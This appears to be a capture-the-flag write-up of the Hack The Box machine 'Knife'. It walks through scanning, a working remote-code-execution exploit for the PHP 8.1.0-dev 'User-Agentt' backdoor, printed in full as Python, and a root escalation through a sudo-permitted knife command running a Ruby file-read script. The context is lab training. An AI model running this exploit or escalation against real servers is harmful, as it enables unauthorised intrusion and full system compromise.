# Knife

### Challenge: FullPWN

### Tools: Nmap, 

Running nmap we can see that port 80 and 22 are open. Lets run a dirb and check out the webpage while it runs.

```console
─[us-dedivip-1]─[10.10.14.93]─[htb-0xrogue@pwnbox-base]─[~]
└──╼ [★]$ nmap -sC -A -Pn 10.129.82.115
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-08 20:55 BST
Nmap scan report for 10.129.82.115
Host is up (0.0043s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.97 seconds
─[us-dedivip-1]─[10.10.14.93]─[htb-0xrogue@pwnbox-base]─[~]
└──╼ [★]$ dirb http://10.129.82.115

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Aug  8 20:57:51 2022
URL_BASE: http://10.129.82.115/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.129.82.115/ ----
+ http://10.129.82.115/index.php (CODE:200|SIZE:5815)                          
+ http://10.129.82.115/server-status (CODE:403|SIZE:278)                       
                                                                               
-----------------
END_TIME: Mon Aug  8 20:58:08 2022
DOWNLOADED: 4612 - FOUND: 2
```
Navigating to the webpage we can see that there is nothing interesting but running a curl command shows that its "X-Powered-By" php 8.1.0.

```console
└──╼ [★]$ curl -I 10.129.82.115
HTTP/1.1 200 OK
Date: Mon, 08 Aug 2022 20:17:49 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Content-Type: text/html; charset=UTF-8
```
A quick google search gives us an axploit we can run to get a shell on the host.

```python
# Exploit Title: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
# Date: 23 may 2021
# Exploit Author: flast101
# Vendor Homepage: https://www.php.net/
# Software Link: 
#     - https://hub.docker.com/r/phpdaily/php
#    - https://github.com/phpdaily/php
# Version: 8.1.0-dev
# Tested on: Ubuntu 20.04
# References:
#    - https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
#   - https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md

"""
Blog: https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
Download: https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py
Contact: flast101.sec@gmail.com

An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
The following exploit uses the backdoor to provide a pseudo shell ont the host.
"""

#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
```

Now running the script gives us a shell!

```console
└──╼ [★]$ python3 php.py 
Enter the full host url:
http://10.129.82.115

Interactive shell is opened on http://10.129.82.115 
Can't acces tty; job crontol turned off.
$ pwd
/

$ whoami
james
```

I had trouble navigating with the limited shell but was able to locate the user flag.

```console
$ pwd
/

$ ls
bin
boot
cdrom
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var

$ ls home
james

$ ls home/james
user.txt

$ cat home/james/user.txt
a90760febfd2ef7c9091d21c9278a563
```

Now to priviledge escalate and grab the root flag. Its always smart to run sudo -l to see what the logged in user can use

```console
$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```
Knife is the vulnerable sudo permission that we can exploit. Coincidence!? I think not!
unfortunately with this being an unstable shell I was unable to get root priviledges with this exploit from GTFO bins so we shall use another...

```console
$ sudo knife exec -E 'exec "/bin/sh"'
No input file specified.
```
Since knife can execute ruby scripts, we will make a quick script to read the root flag with sudo permissions.

```console
$ echo "data = File.read(\"/root/root.txt\")\r\nputs data" > ~/flag.rb

$ sudo knife exec ~/flag.rb
42aba59bd6f8d5ab6d7ab1e9c83945bb
```

Voila we have both flags!

Pretty simple box. I had a little trouble after the GTFO bins didn't work on the knife command, but a little digging showed that it can run ruby scripts so then my next challenge became creating a ruby script to read the flag.
